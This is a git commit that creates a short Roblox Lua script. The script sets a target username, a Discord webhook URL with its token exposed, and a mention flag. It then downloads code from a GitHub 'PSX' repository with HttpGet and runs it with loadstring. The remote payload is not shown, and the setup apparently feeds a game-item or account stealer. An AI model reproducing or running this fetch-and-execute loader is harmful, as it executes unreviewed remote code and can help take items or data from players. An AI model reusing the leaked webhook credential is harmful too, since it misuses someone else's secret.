922c965800d2c940914a8cb29f72d57b9c3ab6bd
RayzeBw <124446227+RayzeBw@users.noreply.github.com>
2023-02-04 22:37:48 -0300

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,4 @@
+UserName = "p3droo_ss"
+WebHook = "https://discord.com/api/webhooks/1071281335211151413/y08Aw_JBXlgpM6cp5X9SblsHtsSQsvihJQ0A8A7IlzZa8WU_hhs5EaTM5fyHA0yNmoYr"
+Mention = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
